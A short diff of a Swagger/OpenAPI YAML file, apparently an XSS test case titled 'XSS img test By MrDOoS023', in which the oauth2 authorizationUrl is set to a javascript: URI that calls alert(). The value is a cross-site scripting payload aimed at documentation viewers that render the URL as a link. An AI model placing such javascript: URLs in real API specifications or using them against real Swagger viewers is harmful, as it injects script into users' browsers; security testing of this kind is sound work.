@@ -1,7 +1,7 @@
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:alert(/MrDOoS023/)//
+    authorizationUrl: javascript:alert(/MrDOoS0203/)//
 info:
   version: "1.0.0"
   title: XSS img test By MrDOoS023
